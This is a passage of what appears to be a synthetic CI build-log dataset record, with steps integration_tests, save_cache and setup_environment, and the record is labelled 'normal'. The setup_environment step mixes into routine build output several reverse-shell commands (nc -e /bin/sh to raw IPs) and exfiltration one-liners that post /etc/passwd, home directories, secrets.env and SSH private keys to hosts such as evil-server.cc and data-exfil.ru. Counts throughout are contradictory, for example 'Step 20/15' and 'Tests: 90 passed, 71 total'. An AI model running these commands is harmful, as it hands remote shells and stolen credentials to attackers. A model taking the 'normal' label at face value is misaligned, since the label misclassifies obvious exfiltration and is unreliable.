          "Verifying...",
          "Artifact uploaded: dist.zip (34MB)",
          "\u2713 All checks passed",
          "Ran 17 tests in 59s",
          "Artifact downloaded: 42MB",
          "Environment: staging",
          "[12:47:36] INFO: Cache refreshed",
          "Success!",
          "Minifying vendor.js",
          "Cache saved successfully",
          "Cache miss for key-7119",
          "[12:47:36] WARN: Deprecated API usage",
          "[12:47:36] INFO: Request completed",
          "Building Docker image...",
          "pip: Downloading express-5.1.tar.gz",
          "Step 15/21: Testing",
          "\u2713 All checks passed",
          "[12:47:36] INFO: Request completed",
          "Installing webpack@4.0.1",
          "Layer 8/11: ENV command",
          "\u2713 build completed",
          "Generating source maps...",
          "Step 8/23: Deploying",
          "pip install: Successfully installed express-3.13",
          "WARNING: axios has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:36] DEBUG: Connection pool: 12 active",
          "[12:47:36] WARN: Deprecated API usage",
          "Cache hit for key-1030",
          "Connection established",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-27T12:50:38.775188",
        "finished_at": "2025-11-27T12:50:47.612056",
        "log_lines": [
          "=== Step: save_cache ===",
          "Pushing to registry...",
          "[12:47:36] DEBUG: Connection pool: 11 active",
          "Installing express@5.17.6",
          "Compiling components/service.java...",
          "[12:47:36] DEBUG: Memory usage: 960MB",
          "WARNING: eslint has known vulnerabilities",
          "Processing...",
          "Ready.",
          "[12:47:36] DEBUG: Query executed in 94ms",
          "npm notice: created a lockfile",
          "pip: Downloading express-1.1.tar.gz",
          "FAILED: test_auth_login",
          "  PASS: unit/test_user_create.spec.js",
          "pip: Downloading express-3.16.tar.gz",
          "Step 18/25: Building",
          "Optimizing 33 modules...",
          "Pushing to registry...",
          "Done.",
          "Compiling lib/utils.go...",
          "Processing...",
          "POST /api - 201 (334ms)",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_user_create (7ms)",
          "Installing jest@3.6.7",
          "Ready.",
          "Step 6/18: Deploying",
          "Step 8/17: Linting",
          "Loading...",
          "Time: 19.648s",
          "  PASS: e2e/test_db_connect.spec.js",
          "  PASS: integration/test_user_create.spec.js",
          "Pulling image: alpine:3.11",
          "Optimizing 78 modules...",
          "Minifying vendor.js",
          "Generating source maps...",
          "npm install: resolved 884 packages",
          "NODE_ENV=test",
          "Waiting...",
          "Cache invalidated: dependencies",
          "Exception: TypeError",
          "npm install: added 417 packages",
          "POST /upload - 200 (448ms)",
          "Step 9/18: Building",
          "[12:47:36] DEBUG: Query executed in 24ms",
          "Step 3/24: Deploying",
          "npm install: added 352 packages",
          "\u2713 Step 'install' succeeded",
          "WARNING: lodash has known vulnerabilities",
          "Already up to date.",
          "  PASS: test_api_health (497ms)",
          "Step 20/22: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing lodash@4.13.8",
          "[12:47:36] INFO: Processing request",
          "OK",
          "[12:47:36] DEBUG: Query executed in 13ms",
          "Cache miss for key-9203",
          "Verifying...",
          "  PASS: e2e/test_user_create.spec.js",
          "Installing axios@1.5.0",
          "GET /api - 201 (95ms)",
          "Compiling components/main.py...",
          "[12:47:36] INFO: Connecting to database",
          "Waiting...",
          "Step 20/15: Building",
          "[12:47:36] INFO: Request completed",
          "\u2713 Step 'setup' succeeded",
          "[12:47:36] DEBUG: Initializing service",
          "Completed.",
          "npm notice: package.json updated",
          "[12:47:36] INFO: Connecting to database",
          "[12:47:36] WARN: Deprecated API usage",
          "\u2713 validate completed",
          "\u2717 build failed with exit code 7",
          "Tests: 90 passed, 71 total",
          "Cache invalidated: node_modules",
          "Uploading artifact 'dist' (16 files)",
          "pip: Installing build dependencies...",
          "Step 14/18: Installing dependencies",
          "Coverage: 100% statements, 88% branches",
          "Time: 114.241s",
          "pip install: Successfully installed webpack-1.1",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "Cache hit for key-6005",
          "Time: 118.112s",
          "Compiling src/handler.rs...",
          "Done.",
          "npm notice: created a lockfile",
          "[12:47:36] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "Finished.",
          "Waiting...",
          "Compiling src/service.java...",
          "Environment: development",
          "Compiling utils/app.ts...",
          "Ran 162 tests in 52s",
          "Coverage: 84% statements, 95% branches",
          "Cache hit for key-3037",
          "\u2713 Task completed in 699ms",
          "Step 11/23: Deploying",
          "Artifact downloaded: 18MB",
          "Cache hit for key-6607",
          "Loading...",
          "Loading...",
          "Uploading artifact 'coverage' (9 files)",
          "Pushing to registry...",
          "pip: Collecting eslint",
          "POST /data - 200 (153ms)",
          "GET /status - 201 (40ms)",
          "Step 5/19: Linting",
          "Completed.",
          "Ran 18 tests in 23s",
          "npm install: added 492 packages",
          "Completed.",
          "[12:47:36] DEBUG: Query executed in 5ms",
          "Cache saved successfully",
          "Artifact downloaded: 34MB",
          "Building Docker image...",
          "Done.",
          "Cache hit for key-6859",
          "Transforming 101 files...",
          "HEAD is now at 5f99fb6",
          "Compiling src/utils.go...",
          "Artifact downloaded: 7MB",
          "npm install: resolved 1873 packages",
          "Ran 18 tests in 28s",
          "Artifact downloaded: 12MB",
          "TLS handshake completed",
          "  PASS: test_cache_hit (497ms)",
          "Time: 55.101s",
          "NODE_ENV=test",
          "Cache restored successfully (224MB)",
          "yarn add: Done in 27.85s",
          "Cache restored successfully (424MB)",
          "Compiling components/main.py...",
          "Transforming 547 files...",
          "HEAD is now at ec353b6",
          "Success!",
          "Step 1/15: Running migrations",
          "pip: Installing build dependencies...",
          "WARNING: webpack has known vulnerabilities",
          "Building Docker image...",
          "WARNING: prettier has known vulnerabilities",
          "Switched to branch 'bugfix/task-322'",
          "\u2713 package completed",
          "[12:47:36] DEBUG: Query executed in 39ms",
          "pip install: Successfully installed react-5.19",
          "pip: Installing build dependencies...",
          "[12:47:36] DEBUG: Query executed in 91ms",
          "Switched to branch 'hotfix/task-596'",
          "Step 1/17: Running migrations",
          "Optimizing 80 modules...",
          "[12:47:36] WARN: Deprecated API usage",
          "Bundling runtime.css",
          "Time: 110.938s",
          "Step 6/15: Testing",
          "[12:47:36] INFO: Request completed",
          "Compiling utils/service.java...",
          "Artifact downloaded: 30MB",
          "Bundling runtime.css",
          "Step 1/23: Running migrations",
          "Cache saved successfully",
          "Creating production build...",
          "NODE_ENV=development",
          "npm notice: package.json updated",
          "[12:47:36] INFO: Processing request",
          "Switched to branch 'bugfix/task-840'",
          "POST /upload - 200 (389ms)",
          "Cache restored successfully (318MB)",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "\u2713 Step 'setup' succeeded",
          "Cache miss for key-6316",
          "Already up to date.",
          "Pushing to registry...",
          "WARNING: webpack has known vulnerabilities",
          "yarn add: Done in 2.23s",
          "Optimizing 23 modules...",
          "pip: Downloading react-3.6.tar.gz",
          "npm install: resolved 1507 packages",
          "TLS handshake completed",
          "Uploading artifact 'build' (32 files)",
          "Time: 29.243s",
          "Tests: 106 passed, 140 total",
          "Cache invalidated: node_modules",
          "Completed.",
          "Step 6/16: Building",
          "Waiting...",
          "Exception: NullPointerException",
          "Step 17/17: Installing dependencies",
          "[12:47:36] INFO: Starting build process",
          "Ran 47 tests in 47s",
          "Verifying...",
          "Time: 64.327s",
          "Artifact uploaded: dist.zip (21MB)",
          "Step 11/16: Running migrations",
          "[12:47:36] INFO: Processing request",
          "Ran 96 tests in 7s",
          "Minifying main.js",
          "Processing...",
          "[12:47:36] INFO: Connecting to database",
          "Time: 96.316s",
          "Using Node.js 19.12.2",
          "[12:47:36] DEBUG: Query executed in 61ms",
          "Tests: 356 passed, 441 total",
          "Compiling components/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2717 build failed with exit code 40",
          "OK",
          "Ready.",
          "[12:47:36] DEBUG: Memory usage: 1850MB",
          "Success!",
          "Pulling image: alpine:latest",
          "Step 7/15: Deploying",
          "Artifact downloaded: 35MB",
          "Cache miss for key-2061",
          "Verifying...",
          "pip: Downloading webpack-3.11.tar.gz",
          "Optimizing 58 modules...",
          "Step 14/17: Deploying",
          "Minifying vendor.js",
          "[12:47:36] DEBUG: Memory usage: 1324MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Environment: development",
          "Done.",
          "Processing...",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Fetching from https://amazonaws.com/package.json",
          "[12:47:36] DEBUG: Connection pool: 13 active",
          "HEAD is now at c1ff97c",
          "Using Python 3.12",
          "[12:47:36] INFO: Starting build process",
          "WARNING: lodash has known vulnerabilities",
          "Artifact downloaded: 35MB",
          "Using Node.js 15.0.3",
          "Loading...",
          "Cache miss for key-2125",
          "Compiling lib/app.ts...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-27T12:50:47.612056",
        "finished_at": "2025-11-27T12:51:02.340169",
        "log_lines": [
          "nc -e /bin/sh 185.220.213.171 6768",
          "=== Step: setup_environment ===",
          "[12:47:36] ERROR: Connection failed",
          "Cache invalidated: dependencies",
          "Processing...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Step 17/17: Testing",
          "GET /health - 200 (90ms)",
          "Success!",
          "Snapshots: 31 passed, 9 total",
          "GET /health - 204 (5ms)",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "[12:47:36] WARN: Deprecated API usage",
          "Artifact downloaded: 13MB",
          "Switched to branch 'bugfix/task-633'",
          "Coverage: 94% statements, 91% branches",
          "Coverage: 85% statements, 88% branches",
          "\u2713 build completed",
          "Cache miss for key-8174",
          "Generating source maps...",
          "Connection established",
          "pip: Installing build dependencies...",
          "Compiling utils/app.ts...",
          "Coverage: 81% statements, 89% branches",
          "[12:47:36] INFO: Cache refreshed",
          "[12:47:36] INFO: Connecting to database",
          "Ran 117 tests in 55s",
          "\u2713 Step 'install' succeeded",
          "Compiling utils/service.java...",
          "Waiting...",
          "Cache invalidated: node_modules",
          "Cache saved successfully",
          "Installing react@1.11.7",
          "Compiling src/utils.go...",
          "nc -e /bin/sh 81.59.239.196 58699",
          "Step 17/15: Deploying",
          "yarn add: Done in 2.65s",
          "Finished.",
          "Step 6/25: Linting",
          "npm install: resolved 586 packages",
          "Compiling src/main.py...",
          "Step 4/16: Testing",
          "[12:47:36] DEBUG: Memory usage: 1297MB",
          "Sending 77MB of data to data-exfil.ru",
          "[12:47:36] INFO: Processing request",
          "Coverage: 81% statements, 70% branches",
          "Switched to branch 'bugfix/task-523'",
          "Building Docker image...",
          "\u2713 test completed",
          "npm notice: package.json updated",
          "Using Python 3.12",
          "Using Python 3.10",
          "Step 20/20: Running migrations",
          "Step 7/18: Running migrations",
          "Transforming 793 files...",
          "Compiling lib/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Done.",
          "Artifact uploaded: dist.zip (69MB)",
          "Optimizing 53 modules...",
          "pip: Downloading lodash-2.13.tar.gz",
          "Building Docker image...",
          "Cache saved successfully",
          "Ran 171 tests in 22s",
          "\u2713 Task completed in 1002ms",
          "Ready.",
          "[12:47:36] DEBUG: Connection pool: 6 active",
          "Minifying vendor.js",
          "FAILED: test_auth_login",
          "Test Suites: 27 passed, 32 total",
          "npm notice: package.json updated",
          "Test Suites: 34 passed, 5 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 7/21: Testing",
          "npm notice: package.json updated",
          "Step 8/24: Testing",
          "pip: Installing build dependencies...",
          "Connection established",
          "Ran 182 tests in 16s",
          "Loading...",
          "pip: Collecting jest",
          "Artifact uploaded: dist.zip (13MB)",
          "Waiting...",
          "[12:47:36] DEBUG: Initializing service",
          "Step 10/19: Running migrations",
          "nc -e /bin/sh 129.180.83.219 59769",
          "Step 3/21: Installing dependencies",
          "yarn add: Done in 20.95s",
          "npm notice: package.json updated",
          "Installing eslint@4.5.8",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Processing...",
          "Compiling lib/main.py...",
          "Switched to branch 'bugfix/task-697'",
          "[12:47:36] INFO: Starting build process",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Image pulled successfully",
          "npm notice: created a lockfile",
          "Installing express@3.16.0",
          "WARNING: express has known vulnerabilities",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Switched to branch 'feature/task-567'",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "yarn add: Done in 19.44s",
          "Connection established",
          "Artifact downloaded: 37MB",
          "[12:47:36] INFO: Request completed",
          "npm install: resolved 689 packages",
          "Artifact uploaded: dist.zip (7MB)",
          "yarn add: Done in 12.54s",
          "Cache saved successfully",
          "Using Node.js 20.15.0",
          "pip: Installing build dependencies...",
          "\u2717 build failed with exit code 85",
          "Checking out develop branch",
          "pip: Collecting axios",
          "Cache miss for key-1095",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "pip install: Successfully installed express-3.1",
          "Artifact uploaded: dist.zip (62MB)",
          "Building Docker image...",
          "WARNING: express has known vulnerabilities",
          "Using Node.js 18.3.7",
          "[12:47:36] INFO: Request completed",
          "Ran 18 tests in 23s",
          "Snapshots: 30 passed, 35 total",
          "nc -e /bin/sh 234.22.111.24 26688",
          "HEAD is now at 4736725",
          "  PASS: unit/test_api_health.spec.js",
          "[12:47:36] DEBUG: Connection pool: 20 active",
          "pip: Collecting react",
          "Environment: development",
          "OK",
          "NODE_ENV=production",
          "Image pulled successfully",
          "POST /data - 200 (15ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "OK",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 223.217.146.50 53624",
          "OK",
          "Success!",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Done.",
          "Building Docker image...",
          "Sending 96MB of data to malicious-pool.xyz",
          "Snapshots: 26 passed, 27 total",
          "GET /api - 200 (40ms)",
          "Waiting...",
          "Ready.",
          "Optimizing 12 modules...",
          "Switched to branch 'bugfix/task-750'",
          "Switched to branch 'hotfix/task-660'",
          "WARNING: jest has known vulnerabilities",
          "Step 10/18: Building",
          "Image pulled successfully",
          "npm install: resolved 934 packages",
          "FAILED: test_cache_hit",
          "pip: Installing build dependencies...",
          "HEAD is now at 1c1c2fd",
          "WARNING: webpack has known vulnerabilities",
          "npm notice: package.json updated",
          "[12:47:36] DEBUG: Memory usage: 636MB",
          "Ready.",
          "GET /health - 200 (55ms)",
          "Cache saved successfully",
          "[12:47:36] DEBUG: Connection pool: 20 active",
          "Completed.",
          "[12:47:36] DEBUG: Connection pool: 20 active",
          "pip install: Successfully installed lodash-2.4",
          "Artifact uploaded: dist.zip (85MB)",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Fetching from https://pypi.org/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling components/handler.rs...",
          "Already up to date.",
          "HEAD is now at 702de6f",
          "Ran 164 tests in 27s",
          "\u2713 package completed",
          "Minifying vendor.js",
          "Environment: production",
          "Pushing to registry...",
          "Loading...",
          "[12:47:36] INFO: Request completed",
          "OK",
          "FAILED: test_db_connect",
          "POST /upload - 200 (232ms)",
          "Ready.",
          "[12:47:36] DEBUG: Memory usage: 537MB",
          "Environment: development",
          "pip: Downloading lodash-1.4.tar.gz",
          "Compiling components/index.js...",
          "Success!",
          "[12:47:36] ERROR: Connection failed",
          "FAILED: test_api_health",
          "  PASS: integration/test_db_connect.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "[12:47:36] DEBUG: Connection pool: 11 active",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "[12:47:36] DEBUG: Memory usage: 829MB",
          "Using Node.js 14.13.0",
          "Generating source maps...",
          "Pulling image: alpine:3.11",
          "Creating production build...",
          "[12:47:36] WARN: Deprecated API usage",
          "Minifying main.js",
          "Creating production build...",
          "pip install: Successfully installed prettier-4.17",
          "Compiling components/main.py...",
          "Pushing to registry...",
          "  PASS: test_user_create (291ms)",
          "Ran 68 tests in 10s",
          "\u2717 build failed with exit code 110",
          "Coverage: 78% statements, 78% branches",
          "\u2713 build completed",
          "Snapshots: 33 passed, 14 total",
          "[12:47:36] DEBUG: Connection pool: 20 active",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 156.109.137.222 60667",
          "Test Suites: 21 passed, 47 total",
          "Cache saved successfully",
          "Ran 31 tests in 33s",
          "WARNING: webpack has known vulnerabilities",
          "Compiling components/handler.rs...",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "pip install: Successfully installed jest-4.12",
          "Sending 256MB of data to evil-server.cc",
          "pip install: Successfully installed lodash-2.18",
          "  PASS: test_cache_hit (359ms)",
          "Building Docker image...",
          "WARNING: lodash has known vulnerabilities",
          "Time: 57.750s",
          "[12:47:36] DEBUG: Loading configuration",
          "  PASS: test_db_connect (206ms)",
          "Cache restored successfully (81MB)",
          "Checking out master branch",
          "WARNING: prettier has known vulnerabilities",
          "Step 17/15: Running migrations",
          "Compiling src/utils.go...",
          "Transforming 836 files...",
          "Checking out master branch",
          "Fetching from https://githubusercontent.com/package.json",
          "yarn add: Done in 18.92s",
          "Cache miss for key-7389",
          "Sending 337MB of data to malicious-pool.xyz",
          "[12:47:36] INFO: Processing request",
          "Compiling utils/app.ts...",
          "Compiling components/index.js...",
          "[12:47:36] ERROR: Connection failed",
          "Step 6/19: Deploying",
          "Ran 70 tests in 59s",
          "pip: Downloading webpack-2.7.tar.gz",
          "[12:47:36] INFO: Processing request",
          "Step 17/16: Deploying",
          "Compiling components/main.py...",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Artifact downloaded: 29MB",
          "npm install: added 227 packages",
          "[12:47:36] ERROR: Connection failed",
          "Sending 316MB of data to crypto-mine.io",
          "[12:47:36] DEBUG: Query executed in 3ms",
          "[12:47:36] DEBUG: Memory usage: 184MB",
          "Minifying app.js",
          "=== Step setup_environment completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}